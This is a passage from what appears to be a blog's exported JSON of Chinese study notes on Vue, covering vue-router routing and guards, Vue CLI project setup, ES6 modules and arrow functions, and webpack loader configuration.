:to=&quot;&#x27;/user/&#x27; + userId&quot;&gt;用户&lt;/router-link&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; name: &quot;App&quot;, data() &#123; return &#123; userId: &quot;lisi&quot;, &#125;; &#125;,&#125;&lt;/script&gt; $router : new出来的路由对象 $route : 处于活跃的路由 12345678910111213141516//User.vue&lt;template&gt; &lt;div&gt; &lt;h2&gt;我是用户界面&lt;/h2&gt; &lt;p&gt;我是用户相关信息&lt;/p&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; name: &quot;User&quot;,&#125;;&lt;/script&gt;&lt;style&gt;&lt;/style&gt; 1234567891011121314151617181920//index.js//1.导入 +import User from &#x27;../components/User.vue&#x27;//2.创建VueRouter对象 +const routes = [&#123; //放在第一个 是好习惯 而非固定要求 path: &#x27;/&#x27;, redirect: &#x27;/home&#x27;&#125;, &#123; path: &#x27;/home&#x27;, component: Home&#125;, &#123; path: &#x27;/about&#x27;, component: About&#125;, &#123; path: &#x27;/user&#x27;, component: User&#125;] 但是不能起到拼接userid的作用 12345678910111213141516171819202122//index.js &#123; path: &#x27;/user/:userId&#x27;, //只改这里 不会渲染user component: User&#125;//App.vue//没有动态&lt;router-link to=&quot;/user/zhangsan&quot;&gt;用户&lt;/router-link&gt; //在跳转的时候 添加/zhangsan//动态获取 属性动态添加 下面的data&lt;router-link :to=&quot;&#x27;/user/&#x27; + userId&quot;&gt;用户&lt;/router-link&gt;export default &#123; name: &quot;App&quot;, data() &#123; return &#123; userId: &quot;lisi&quot;, &#125;; &#125;,&#125; 将用户id获取到 然后在User.vue使用 12345678910111213141516171819202122232425//User.vue&lt;template&gt; &lt;div&gt; &lt;h2&gt;我是用户界面&lt;/h2&gt; &lt;p&gt;我是用户相关信息&lt;/p&gt; &lt;h2&gt;&#123;&#123; userId &#125;&#125;&lt;/h2&gt; //!!!! &lt;h2&gt;&#123;&#123; $route.params.userId &#125;&#125;&lt;/h2&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; name: &quot;User&quot;, computed: &#123; userId() &#123; //$route 拿到的是活跃的router //param：参数 userId : path: &#x27;/user/:userId&#x27; 的 return this.$route.params.userId; //!!! &#125;, &#125;,&#125;;&lt;/script&gt;&lt;style&gt;&lt;/style&gt; 7.路由懒加载(p109-110) 7. 1vue-router打包文件的解析 dist &gt; static &gt; index.html + css + js &gt;app… + manifest… + vendor… 在打包的时候 会自动把css文件 跟js文件分开放，不会像之前一样都放在一个js文件里 而js文件也有分不同的包 app : 当前应用程序开发的所有代码 （业务代码） manifest：为打包的代码做底层（底层导入，导出 或者更复杂的操作）支撑 vendor：（提供商，第三方：vue/vue-router/axios/bs）第三方的东西 7.2 认识路由懒加载 官方解释： 当打包构建应用时，JavaScript包会很大，影响页面加载 如果能把不同路由对应的组件分割成不同的代码块，然后当路由被访问的时候才加载对应的组件，这样比较高效 路由懒加载做的东西： 主要作用：将路由对应的组件打包成一个个的js代码块 只有在这个路由被访问到的时候，才加载对应的组件 7.3 懒加载的方式 结合Vue的异步组件和Webpack的代码分析（能认识就好） 1const Home = resolve =&gt; &#123; require.ensure([&#x27;../components/Home.vue&#x27;],() =&gt; &#123; resolve(require(&#x27;../components/Home.vue&#x27;)) &#125;)&#125; AMD写法： 1const About = resolve =&gt; require([&#x27;../components/About.vue&#x27;],resolve); 在Es6中，我们可以有更加简单的写法来组织Vue异步组件和Webpack的代码分割(常用) 12345678//代替导入操作 推荐使用const Home = () =&gt; import(&#x27;../components/Home.vue&#x27;);//也可以在路由那里直接使用&#123; path:&#x27;/home&#x27;, component:() =&gt; import(&#x27;../components/Home&#x27;)&#125; 这个时候在npm run build 打包的时候 就会发现 js文件夹下 多了3个js文件 一个懒加载 一个js文件 3.vue-router嵌套路由 3.1 认识嵌套路由 比如在home页面中，希望通过/home/news 和 /home/message访问一些内容 一个路径映射一个组件，访问这两个路径也会分别渲染两个组件 路径和组件的关系： 实现嵌套路由的步骤： 创建对应的子组件，并且在路由映射中配置对应的子路由 在组件内部使用&lt;router-view&gt;标签 3.2 路由的嵌套使用 新建两个HomeNews.vue HomeMessage.vue 组件 在index.js 配置上述两个vue的映射关系 1234567891011121314//index.jsconst routes = [ &#123; path: &#x27;/home&#x27;, component: Home, children: [&#123; path: &#x27;news&#x27;, //不用加 ‘/’ 会自动给加上：&#x27;/home/news&#x27; component: HomeNews &#125;, &#123; path: &#x27;message&#x27;, component: HomeMessage &#125;]&#125;] 子路由的显示 12345678910//因为这些vue是显示在home页面的 所以在Home.vue页面中 添加`&lt;router-view&gt;`&lt;template&gt; &lt;div&gt; &lt;h2&gt;我是首页&lt;/h2&gt; &lt;!-- 要写完成路径 --&gt; &lt;router-link to=&quot;/home/news&quot;&gt;新闻&lt;/router-link&gt; &lt;router-link to=&quot;/home/message&quot;&gt;消息&lt;/router-link&gt; &lt;router-view&gt;&lt;/router-view&gt; &lt;/div&gt;&lt;/template&gt; 默认显示新闻路径 配置映射 1234567891011//index.jschildren: [&#123; path: &#x27;&#x27;, redirect: &#x27;news&#x27; &#125;, &#123; path: &#x27;news&#x27;, //不用加 ‘/’ 会自动给加上：&#x27;/home/news&#x27; component: HomeNews &#125;, &#123; path: &#x27;message&#x27;, component: HomeMessage &#125;] 4.vue-router参数传递 4.1 传递参数的方式：params和query params类型：只传一个简单的参数 配置路由格式：/router/:id 传递的方式：在path后面跟上对应的值:to=&quot;'/user/' + userId&quot; 传递后形成的路径：/router/123、/router/abc query类型： 配置路由格式：/router ，也就是普通配置 传递的方式：对象中使用query的key作为传递方式 传递后形成的路径：/router?id=123、/router?id=abc 4.2 query类型的使用 创建新的组件 Profile.vue 配置路由映射 index.js 导入：const Profile = () =&gt; import ('../components/Profile.vue'); 配置映射：&#123; path: '/profile', component: Profile &#125; 添加跳转的&lt;router-link&gt; app.vue &lt;router-link to=&quot;/profile&quot;&gt;我的&lt;/router-link&gt; 将参数传递到url 12345//index.js//若想把&#123;&#125; 当成对象 就得加 v-bind 这样才能被当成语法去解析&lt;router-link :to=&quot;&#123;path:&#x27;/profile&#x27;,query:&#123;name:&#x27;why&#x27;,age:18,height1&#x27;1.88&#125;&#125;&quot;&gt;我的&lt;/router-link&gt;//此时点击页面的&#x27;我的&#x27; 地址显示为 localhost:8080/profile?name=why&amp;age=18&amp;height=1.88 去参数渲染到页面上 1234567//Profile.vue&lt;template&gt; &lt;div&gt; &lt;h2&gt;我是档案（我的）标题&lt;/h2&gt; &lt;h2&gt;&#123;&#123; $route.query.name &#125;&#125;&lt;/h2&gt; &lt;/div&gt;&lt;/template&gt; 4.3 当不使用router-link而使用普通的标签 传递参数 1234567891011121314151617181920212223242526272829303132333435//App.vue 单纯想要 跳转页面时&lt;template&gt; &lt;div id=&quot;app&quot;&gt; &lt;button @click=&quot;userClick&quot;&gt;用户&lt;/button&gt; &lt;button @click=&quot;profileClick&quot;&gt;我的&lt;/button&gt; &lt;router-view&gt;&lt;/router-view&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; name: &quot;App&quot;, data() &#123; return &#123; userId: &quot;lisi&quot;, &#125;; &#125;, methods: &#123; userClick() &#123; //单纯想要 跳转页面时 this.$router.push(&quot;/user/&quot; + this.userId); &#125;, profileClick() &#123; //想要传递数据时 this.$router.push(&#123; path:&#x27;/profile&#x27;, query:&#123; name:&#x27;kobe&#x27;, age:18, height:1.88 &#125; &#125;); &#125;, &#125;,&#125;;&lt;/script&gt; 4.4 vue-router ： router route 的由来(p111) $router和$route是有区别的： $router为VueRouter实例，想要导航到不同URL，则使用$router.push方法 $route为当前router跳转对象里面可以获取name、path、query、params等 所有的组件 继承 vue原型 5.vue-router导航守卫 实现点击 切换文档标题 5.1 生命周期函数 created：当组件被创建时调用 mounted：当模板渲染好后被调用 updated：页面更新时被调用 12345678910111213141516&lt;script&gt; //user组件为例 export default&#123; name:&quot;User&quot;, computed:&#123; userId()&#123; return this.$route.params.id &#125; &#125;, created()&#123; console.log(&#x27;created&#x27;); //在这个时候可以做一些事情 比如将 title改为首页 document.title=&#x27;首页&#x27; &#125; &#125;&lt;/script&gt; 5.2 全局导航守卫 因为一个一个+需求代码 太麻烦了 因为所有的跳转都是路由跳转，所以可以监听路由跳转的过程 监听：全局导航守卫 1234567891011121314151617181920212223242526//index.jsconst routes =[ &#123; path:&#x27;/home&#x27;, component:Home, //可以在每个路由加上这个属性 meta:&#123; title:&#x27;首页&#x27; &#125; &#125;]const router = new VueRouter(&#123;&#125;); //后面//前置守卫（guard） 跳转前调用router.beforeEach((to, from, next) =&gt; &#123; //从from 跳转到 to to:route类型 活跃的路由 //to.meta.title 第一个的时候是undefined document.title = to.matched[0].meta.title; next(); //必须调用next 不然不会进行下一步&#125;)//后置钩子hook 跳转之后调用 不需要主动调用next()函数router.afterEach((to, from) =&gt; &#123; console.log(&#x27;----&#x27;);&#125;) &#125; 5.3 路由独享守卫 可以到官网学习 : 导航守卫 123456789101112&#123; path: &#x27;/profile&#x27;, component: Profile, meta: &#123; title: &#x27;我的&#x27; &#125;, //只有进入我的 才会调用 beforeEach((to, from, next) =&gt; &#123; console.log(&#x27;in mine&#x27;); next(); //必须调用next 不然不会进行下一步 &#125;)&#125; 5.4 组件内的守卫 1234const foo =&#123; template:`` ...&#125; 6.vue-router-keep-alive 页面没有保存 组件之前的跳转 比如：在默认展示新闻的首页，点击消息后，又跳转到 关于 的页面，再跳转会首页的时候，展示的还是新闻的页面 因为组件的生命周期：在跳转到关于页面的时候，把首页的组件 销毁了，然后在点击回首页的时候，是重新创建了一个首页组件 不希望被创建新的时候，使用keep-alive 6.1 keep-alive 遇见 vue-router keep-alive是Vue内置的一个组件，可以使被包含的组件保留状态，或避免重新渲染 include - 字符串或正则表达式，只有匹配的组件会被缓存 exclude - 字符串或正则表达式，任何匹配的组件都不会被缓存 router-view是vue-router的一个组件，如果直接被包再keep-alive里面，所有路径匹配到的视图组件都会被缓存 6.2 保存组件状态的解决 在App.vue中，将&lt;router-view&gt;放在&lt;keep-alive&gt;便签里，就可以不重新创建组件 1&lt;keep-alive&gt;&lt;router-view/&gt;&lt;/keep-alive&gt; //保持组件状态 但是这样还是不行 解决方法一： 还是不行第二次回到页面的时候，就不行了 不在index.js下面设置缺省，&#123; path: '', redirect: 'news' &#125; 在Home.vue的created生命周期里，添加this.$router.push('/home/news') 解决方法二：还是不行后保存的path值是后面点击到的活跃状态的path 在Home.vue的data保存一个路径path:'/home/news' activated()&#123; this.$router.push(this.path) &#125; deactivated()&#123; this.path = this.$router.path; &#125; 解决方法三：行了 组件内导航 在Home.vue：activated()&#123; this.$router.push(this.path) &#125; beforeRouteLeave(to,from,next)&#123; this.path = this.$route.path; next() &#125; activated() / deactivated()只有该组件被保持了状态 使用了keep-alive时才有效","categories":[{"name":"learningNotes","slug":"learningNotes","permalink":"https://shylees.github.io/categories/learningNotes/"}],"tags":[{"name":"vue","slug":"vue","permalink":"https://shylees.github.io/tags/vue/"}]},{"title":"05 Vue CLI","slug":"vue/05Vue CLI","date":"2021-03-20T16:00:00.000Z","updated":"2021-03-22T16:00:00.000Z","comments":false,"path":"learningNotes/vue/05Vue CLI","link":"learningNotes/vue/05Vue CLI","permalink":"https://shylees.github.io/learningNotes/vue/05Vue%20CLI","excerpt":"","text":"[TOC] 1.Vue CLI介绍和安装 1.1 CLI 是什么意思？ CLI是Command-Line Interface ，即命令行界面，俗称脚手架 Vue CLI是一个官方发布vue.js项目脚手架 使用vue-cli可以快速搭建Vue开发环境以及对应的webpack配置 1.2 Vue CLI使用前提 - Node node环境要求8.9以上版本 1.3 Vue CLI使用前提 - Webpack Vue.js官方脚手架工具使用了webpack模板 1.4 Vue CLI的使用 安装Vue脚手架 在cmd终端安装 123npm install -g @vue/cli //版本3.2.1vue --version //查看版本 //装了4.5.12 因为安装的是Vue CLI3的版本 如果想按照Vue CLI2的方式初始化项目是不可以的 拉取2.x版本 Vue CLI3和 旧版使用了相同的vue命令 ，所以Vue CLI2(vue-cli)被覆盖了，如果你仍需使用旧版本的 vue init功能，可以全局安装一个桥接工具： 12npm install -g @vue/cli-init //拉取脚手架2 使用脚手架2vue init webpack my-project //使用2 创建项目 Vue CLI2 初始化项目 1vue init webpack my-project Vue CLI3初始化项目 1vue create my-project 1.5 vuecli-CLI2初始化项目过程 In : vue init webpack vuecli2test //项目名字不能大写 下载配置 Out: ? Project name (vuecli2test) //一般文件名 跟项目名一样 Out:? Project description (A Vue.js project) //项目描述 In :test vue cli2 Out:? Author (piaoliangjiejie2019 &lt;piaoliangjiejie2019@outlook.com&gt;) //全局git Out:Runtime + Compiler: recommended for most users Runtime-only: about 6KB lighter min+gzip, but templates (or any Vue-specific HTML) are ONLY allowed in .vue files - render functions are required elsewhere //询问要用哪个构建项目 In : //选择下面个 打包出的小 运行效率高 Out:? Install vue-router? (Y/n) //是否安装路由 暂时not 因为还没学 Out:? Use ESLint to lint your code? (Y/n) //对js的限制 规范代码 if不规范会报错 In :y Out:Standard (https://github.com/standard/standard) Airbnb (https://github.com/airbnb/javascript) none (configure it yourself) //哪个人的规范 In : //暂时选标准 Out:? Set up unit tests (Y/n) //单元测试 用的少 n Out:? Setup e2e tests with Nightwatch? (Y/n) //e to e -&gt;end to end 端到端 n Out:? Should we run npm install for you after the project has been created? (recommended) (Use arrow keys) Yes, use NPM Yes, use Yarn No, I will handle that myself //使用 npm / yarn In : npm 1.6 vuecli-CLI2目录的解析. node test.js 命令 可以直接在终端输出 控制台的内容 2.ESLint规范和runtime compiler/only区别 2.1 eslint 开了两个项目 01runtimecompiler 装了eslint 02runtimeonly 没装eslint eslint 有很多奇奇怪怪的标准 保存就会显示报错信息 选了后 想关掉eslint ：congif-&gt;index.js-&gt; 26 行的 useEslint 改成 false 然后编译即可 2.2 runtime compiler和only的区别（p96） 区别只在main.js里 runtime compiler： 1234567891011import Vue from &#x27;vue&#x27;import App from &#x27;./App&#x27;Vue.config.productionTip = false/* eslint-disable no-new */new Vue(&#123; el: &#x27;#app&#x27;, components: &#123; App &#125;, template: &#x27;&lt;App/&gt;&#x27;&#125;) runtime only： 1234567891011import Vue from &#x27;vue&#x27;import App from &#x27;./App&#x27;Vue.config.productionTip = false/* eslint-disable no-new */new Vue(&#123; el: &#x27;#app&#x27;, render: h =&gt; h(App) // 相当于 //render:function(h)&#123;return h(App)&#125;&#125;) vue运行过程 对比： runtime-compiler ： template -&gt; ast -&gt; render -&gt; vdom -&gt; UI runtime-only（性能更高，代码量更少） render -&gt; vdom -&gt;UI 所以尽量使用 runtime-only render 函数 和 createElement函数 123456789101112//runtime-compilerrender: function(createElement) &#123; //1.普通用法： createElement(&#x27;标签&#x27;,&#123;标签的属性&#125;,[&#x27;&#x27;]) //返回的东西 会覆盖 #app的内容 // return createElement(&#x27;h2&#x27;, &#123; class: &#x27;box&#x27; &#125;, [&#x27;hello&#x27;]); //2.传入组件对象 //这样的话 就是直接使用render函数 省去了前两步内容 效率更高 // return createElement(cpn); return createElement(App); &#125; 在runtime-only main.js 里 App 已经没有包含 template 了 .vue 文件中的template是由 vue-template-compiler ——将.vue文件的template解析成render函数 总结： 如果之后的开发中 依然使用template，就需要选择runtime-compiler 如果使用的是.vue文件 就可以选择runtime-only 3.Vue CLI3(p97-) 3.1 vue-cli 3 与 2 的区别 vue-cli 3 是基于webpack 4 打造的，vue-cli 2 还是 webpack 3 vue-cli 3 的设计是‘0配置’ ，移除的配置文件根目录下的 build和config等目录 vue-cli 3 提供了vue ui 命令，提供了可视化配置，更加人性化 移除了static文件夹，新增了public文件夹，并且index.html移动到public中 3.2 创建项目 In：vue create 03vuecli3test Out：Vue CLI v4.5.12 ? Please pick a preset: (Use arrow keys) //选择配置 &gt;Default ([Vue 2] babel, eslint) //默认2 Default (Vue 3 Preview) ([Vue 3] babel, eslint) //默认3 Manually select features //手动 √ Out： //按空格是 选择 / 取消 (*) Choose Vue version //后面选3.x (*) Babel ( ) TypeScript ( ) Progressive Web App (PWA) Support //先进app 可以缓存很多东西 也有推送通知 ( ) Router ( ) Vuex ( ) CSS Pre-processors //css预处理器 if用less什么的就可以选 (*) Linter / Formatter //eslint ( ) Unit Testing //测试 ( ) E2E Testing //测试 Out：? Where do you prefer placing config for Babel, ESLint, etc.? (Use arrow keys) In dedicated config files In package.json //配置文件的存放位置 独立文件 /pack.json 选单独的 Out：? Save this as a preset for future projects? (y/N) //是否保存配置 会添加到第1个out y 如果想删掉 在 users/lsy/.vuerc 里面有presets 对象 然后删掉里面的 值就可以了 Out：? Save preset as: //保存的名字 coedrwhy 3.3 跑项目 3.3.1 cli 2 3.3.2 cli3 看package.json 的scripts的东西 里面是 serve &amp; build 所以是 npm run serve 开发/ build 发布 123456789101112import &#123; createApp &#125; from &#x27;vue&#x27;import App from &#x27;./App.vue&#x27;createApp(App).mount(&#x27;#app&#x27;)//相当于 // new Vue(&#123;// el: &quot;#app&quot;,// render: function(h) &#123;// return h(App)// &#125;// &#125;) 3.4 Vue-Cli3配置文件的查看和修改 UI方向的配置 启动配置服务器：vue ui //启动本地服务器 不用进入哪个地址 导入 刚建的文件夹 左2 插件 左3 依赖 左4 配置 可以改的 左5 任务 可以各种运行 src+文件 vue.config.js 1module.exports=&#123;&#125; //会跟其他的配置文件合并一起的 放独有的配置 4.箭头函数的使用和this的指向问题(p99) 4.1 基本使用 123456789101112131415161718192021//1.定义函数的方式：functionconst aaa = function()&#123; &#125;//2.对象字面量中定义函数const obj = &#123; bbb:function()&#123; &#125;, bbb()&#123; &#125;&#125;//3.ES6中的箭头函数const ccc = (参数列表) =&gt;&#123; &#125;const aaa = () =&gt;&#123; &#125; 4.2 箭头函数参数和返回值 1234567891011121314151617181920212223242526272829303132//1.参数问题//1.1放入两个参数const sum =(num1,num2) =&gt;&#123; return num1+num2;&#125;//1.2 放一个参数const power = (num) =&gt;&#123; //括号可以省略 return num*num;&#125;//2.返回值//2.1 函数代码块中有多行代码const test = () =&gt;&#123; //1.打印Hello World console.log(&#x27;Hello World&#x27;); //2.打印Hello Vue console.log(&#x27;Hello Vue&#x27;); &#125;//2.2 函数代码块中只有一行代码const mul = (num1,num2) =&gt;&#123; return num1+num2;&#125;//等同于const mul2 = (num1,num2) =&gt; num1*num2//无返回值时 自动将结果作为返回值 给democonst demo = () =&gt; console.log(&#x27;Hello vue&#x27;) 4.3 箭头函数的this的使用 使用箭头函数多：当准备一个函数作为参数传给另一个函数的时候 123456789101112131415161718192021222324252627282930313233343536373839404142434445setTimeout(function()&#123; console.log(this); //window&#125;,1000)setTimeout(()=&gt;&#123; console.log(this); //window&#125;,1000)//结论：箭头函数中this引用的就是最近作用域中的thisconst obj =&#123; aaa()&#123; setTimeout(function()&#123; console.log(this); //window &#125;) setTimeout(()=&gt;&#123; console.log(this); //obj对象 &#125;) &#125;&#125;const obj =&#123; aaa()&#123; setTimeout(function()&#123; setTimeout(function()&#123; console.log(this); //window &#125;) setTimeout(()=&gt;&#123; console.log(this); //window &#125;) &#125;) setTimeout(()=&gt;&#123; setTimeout(function()&#123; console.log(this); //window &#125;) setTimeout(()=&gt;&#123; console.log(this); //obj &#125;) &#125;) &#125;&#125;","categories":[{"name":"learningNotes","slug":"learningNotes","permalink":"https://shylees.github.io/categories/learningNotes/"}],"tags":[{"name":"vue","slug":"vue","permalink":"https://shylees.github.io/tags/vue/"},{"name":"es6","slug":"es6","permalink":"https://shylees.github.io/tags/es6/"}]},{"title":"04 vue模块化开发","slug":"vue/04模块化开发","date":"2021-03-14T16:00:00.000Z","updated":"2021-03-20T16:00:00.000Z","comments":false,"path":"learningNotes/vue/04模块化开发","link":"learningNotes/vue/04模块化开发","permalink":"https://shylees.github.io/learningNotes/vue/04%E6%A8%A1%E5%9D%97%E5%8C%96%E5%BC%80%E5%8F%91","excerpt":"","text":"1.什么是模块化 使用模块作为出口： 在匿名函数内定义一个对象 给对象添加各种需要暴露到外面的属性和方法（不需要暴露的直接定义即可） 最后将要暴露的对象返回 并且在外面使用一个moudleB接受 在main.js使用： 只需要使用属于自己模块化的属性和方法即可 这就是模块化最基础的封装，事实上模块的封装还有很多高级的话题： 以下就是最简单的模块的原始雏形 目前前端模块化开发已经有了很多既有的规范，以及应对的方案 常见的模块化规范： CommonJS、AMD、CMD、es6的Modules 1.1 原始的模块化 123456789101112//这样在别的文件 又不会产生命名冲突 又可以使用曾经声明过的变量 直接使用moduleB.flag//早期自己的模块化使用var moduleB = (function()&#123; //导出的对象 var obj = &#123;&#125;; var name = &quot;red&quot;; var flag = true; obj.flag = flag; return obj;&#125;()) 1.2 CommonJS 12345678910111213//aaa.jsvar name =&#x27;ming&#x27;;var flag = true;function sum(num1,num2)&#123; return num1+num2;&#125;//导出语法 必须要有底层支撑才能解析代码 比如nodemodule.exports = &#123; flag:flag, sum&#125; 12345678//mmm.js//导入var &#123;flag,sum&#125; = require(&#x27;./aaa.js&#x27;); //对象的解构 //===var aaa = require(&#x27;./aaa.js&#x27;);var flag = aaa.flag;var sum = aaa.sum; 1.3 es6的模块化的导入导出 1234&lt;!-- html 使用type=‘module’就可以 使用模块化 不会出现命名冲突 --&gt;&lt;script src=&#x27;aaa.js&#x27; type=&#x27;module&#x27;&gt;&lt;/script&gt;&lt;script src=&#x27;bbb.js&#x27; type=&#x27;module&#x27;&gt;&lt;/script&gt;&lt;script src=&#x27;mmm.js&#x27; type=&#x27;module&#x27;&gt;&lt;/script&gt; 12345678910111213141516171819202122232425262728293031323334353637383940//aaa.jsvar name = &#x27;ming&#x27;;var age = 18;var flag = true;function sum(num1,num2)&#123; return num1 + num2;&#125;if(flag)&#123; console.log(sum(20,30))&#125;//1.导出方式一：导出给其他js使用本js的变量export&#123; flag,sum&#125;//2.导出方式二：定义时就导出变量export var num1 = 1000;export var height = 1.88;//3.导出函数/类export function mul(num1,num2)&#123; return num1+num2;&#125;export class Person&#123; run()&#123; console.log(&#x27;running&#x27;) &#125;&#125;//4.export default//某些情况下，一个模块中包含某个功能 我们不希望给这个功能命名 而且想让导入者可以自己来命名//在同一个模块中只能有一个const address = &#x27;bj&#x27;export default address;export default function(arg)&#123; console.log(arg);&#125; 12345678910111213141516171819202122//mmm.js//1.导入&#123;&#125;定义的变量import &#123;flag&#125; from &quot;./aaa.js&quot;;if(flag)&#123; console.log(&#x27;xiaoming&#x27;);&#125;//2.直接导入export定义的变量import &#123;num1, height&#125; from &quot;./aaa.js&quot;;//3.导入export的functionimport &#123;mul,Person&#125; from &quot;./aaa.js&quot;;const p = new Person();p.run();//4.导入export default 导入aaa.js默认导出的东西import addr from &quot;./aaa.js&quot;;//5.统一全部导入import * as aaa from &quot;./aaa.js&quot;;aaa.flag; 2.webpack详解 2.1 认识webpack At its core，webpack is a static module bundler for modern JavaScript applications 从本质上，webpack是一个现代的JavaScript应用的静态模块打包工具 模块、打包 打包工具：grunt、gulp、webpack 2.1.1前端模块化 除了ES6的模块化的底层是靠浏览器的支撑外，其他都需要借助别其他的工具，才能进行模块化开发 并且在通过模块化开发完成项目后，还需要处理模块间的各种依赖，并且将其进行整合打包 而webpack其中一个核心就是让我们可能进行模块化开发，并且回帮助我们处理模块间的依赖关系 2.1.2 打包 将webpack中各种资源模块进行打包合并成一个/多个包 在打包过程中，还可以对资源进行处理，比如压缩图片、scss-&gt;css、将es6语法转换成es5语法等 2.1.3 和grunt/gulp的对比 2.2 webpack的安装（p76） webpack为了可以正常运行 必须依赖node环境 node环境为了可以正常的执行很多代码，必须其中包含各种依赖的包 npm工具（node packages manager） 安装node.js Node.js自带了软件包管理工具npm 查看node版本：cmd：node -v 版本大于8.9 全局安装webpack（安装3.6.0 因为vue cli2依赖该版本） 使用npm安装：cmd： npm install webpack@3.6.0 -g 局部安装webpack --save-dev是开发时依赖，项目打包后不需要使用的 全局安装后，还需要局部安装： 在终端直接执行webpack命令，使用的全局安装的webpack 当在package.json中定义了script时，其中包含了webpack命令，那么使用的是局部webpack 2.3 webpack的起步 （p77） 通过vs code 运行webpack进行打包时，报错webpack : 无法加载文件 D:\\nodejs\\node_global\\webpack.ps1，因为在此系统上禁止运行脚本。 解决方案： 以管理员身份运行vs code 执行：get-ExecutionPolicy，显示Restricted，表示状态是禁止的 执行：set-ExecutionPolicy RemoteSigned 这时再执行get-ExecutionPolicy，就显示RemoteSigned dist文件夹里的就是打包的东西，把这个给服务器就好了 12345678910//main.js//1.使用commonjs的模块化规范const &#123; add, mul &#125; = require(&#x27;./mathUtils.js&#x27;);console.log(add(20, 30));console.log(mul(20, 30));//2.使用es6的模块化规范import &#123; name, age, height &#125; from &quot;./info&quot;console.log(name, age, height); 12345678910//mathUtils.jsfunction add(num1, num2) &#123; return num1 + num2;&#125;function mul(num1, num2) &#123; return num1 * num2;&#125;export &#123; add, mul &#125; 12345//info.js//es6的模块化export const name = &quot;why&quot;;export const age = 20;export const height = 1.88; 打包到./dist/dundle.js 1&lt;script src=&quot;./dist/bundle.js&quot;&gt;&lt;/script&gt; 2.4 webpack的配置（p78-82） 2.4.1 入口出口的配置 123456789101112131415161718192021222324//index.html同目录下 新建webpack.config.js//动态获取绝对路径 必须要有path包 下载npm init//包名 当时：meetwebpack//出口 当时：index.js//会生成一个package.json 如果想依赖node.js 一般都会需要 //这里path有依赖 这里会全局搜const path = require(&#x27;path&#x27;);//直接用webpack代替webpack ./src/main.js ./dist/dunble.js//在packae.js 中设置&quot;build:&#x27;webpack&#x27;&quot; 用npm run build 映射 webpackmodule.exports = &#123; //入口 entry: &#x27;./src/main.js&#x27;, //出口 output: &#123; //路径 不能使用相对路径 动态获取绝对路径 //对两路径进行拼接 __dirname 全局变量 保存当前文件的路径 path: path.resolve(__dirname, &#x27;dist&#x27;), //文件名 filename: &#x27;bundle.js&#x27; &#125;,&#125; 2.4.2 局部安装webpack 怎么直接在控制台打上webpack就能让main.js打包成bundle.js 因为全局webpack的版本可能跟本地不一样 所以还得下载个本地的webpack 在package.json中 下载本地webpack后(npm install webpack@3.6.0 - - save-dev) 会自动生成 开发时依赖–“devDependencies”：{“webpack”：“^3.6.0”} 后面会讲到运行时依赖–“dependencies”:{} 只要在命令行/cmd里面使用的都是终端 使用的都是全局的webpack ：webpack 在package.json定义的scripts优先运行本地 npm run build / ./node_modules/webpack.config.js 2.5 loader的使用 2.5.1webpack中使用css文件的配置 2.5.1.1 介绍 加载css、图片、包括一些高级的将ES6转成ES5代码、将TypeScript转成ES5代码、将scss、less转成css、将.jsx、.vue转成js等等 这些webpack本身能力做不到，但其扩展对应的loader就可以 loader使用过程： 步骤一：通过npm安装需要使用的loader 步骤二：在webpack.config.js中的modules关键字下进行配置 大部分loader可以在webpack官网中找到，并且学习对应的用法 2.5.1.2 产生依赖 因为要有依赖才能打包，所以在main.js设置css的依赖 1234//main.js//3.依赖css文件require(&#x27;./css/normal.css&#x27;) 2.5.1.3 loader 因为直接使用的话会报错 说没有找到适合的loader 然后就去官网https://webpack.js.org (英文网址)/https://webpack.js.com （中文网址）找 css-loaderrhttps://webpack.js.org/loaders/css-loader/只负责加载 不负责解析 生效 style-loaderhttps://webpack.js.org/loaders/style-loader/:将模块的导出作为样式添加到DOM 如果报UnhandledPromiseRejectionWarning: TypeError: this.getResolve is not a function 可能是loader版本过高 可以在install时下载 较低版本 npm install --save-dev css-loader@3.3.0 npm install --save-dev style-loader@1.0.0 2.5.1.4 对配置文件的解释 12345678910module: &#123; rules: [&#123; //正则表达式：匹配所有css文件 去应用下面2loader test: /\\.css$/i, //css-loader只负责加载 不负责解析 生效 //还得再下载一个style-loader:将模块的导出作为样式添加到DOM //使用多个loader时 从右到左 use: [&quot;style-loader&quot;, &quot;css-loader&quot;], &#125;, ],&#125;, 2.5.2 less文件处理 123456789//special.less@font-face: 50px;@fontColor: orange;body &#123; font-size: @font-face; color: @fontColor;&#125; 1234//main.js//4.依赖less文件require(&#x27;./css/special.less&#x27;); 文件编写–&gt;终端打包–&gt;报错 说要一个对应的loader处理文件 –&gt;less-loader@4.1.0–&gt;配置文件 12345678910&#123; test: /\\.less$/i, use: [&#123; loader: &quot;style-loader&quot;, &#125;, &#123; loader: &quot;css-loader&quot;, &#125;, &#123; loader: &quot;less-loader&quot;, // compiles Less to CSS &#125;] &#125; 2.5.3 图片处理 css引用图片–&gt;file loader–&gt;url loader + file loader@3.0.1–&gt;配置文件 12345678910111213141516171819202122232425//package.json output: &#123; //路径 不能使用相对路径 动态获取绝对路径 //对两路径进行拼接 __dirname 全局变量 保存当前文件的路径 path: path.resolve(__dirname, &#x27;dist&#x27;), //文件名 filename: &#x27;bundle.js&#x27;, //!!!只要在以后任何有url的地方都会在前面加上dist publicPath: &#x27;dist/&#x27; &#125;, &#123; test: /\\.(png|jpg|gif)$/i, use: [&#123; loader: &#x27;url-loader&#x27;, options: &#123; //使用小于限制时，会将图片编译成base64位字符串 显示出来 limit: 5000, //若大于限制，会要使用&#x27;file roader&#x27;@3.0.1进行加载 安装就好 //base64不需要打包直接从网上获取 //但大于就会将图片进行打包放在dist中 哈希生成名字--&gt;32位hash值 防止名字重复 //所以要加上路径 在output里+“publicPath: &#x27;dist/&#x27;” &#125;, &#125;, ], &#125;, 处理生成的图片名称： 将所有图片放在img，跟原来图片一样的名，同时防止重复 img/name.hash:8.ext 1234567891011&#123; test: /\\.(png|jpg|gif)$/i, use: [&#123; loader: &#x27;url-loader&#x27;, options: &#123; limit: 5000, //if img/name 那文件==name.png name: &#x27;img/[name].[hash:8].[ext]&#x27; &#125;, &#125;, ], &#125;, 2.5.4 es6转es5的babel-loader 官网babel loader–&gt; 安装：npm install --save-dev babel-loader@7 babel-core babel-preset-es2015 配置webpack.config.js文件 1234567891011&#123; test: /\\.js$/, //排除 src外的文件夹 exclude: 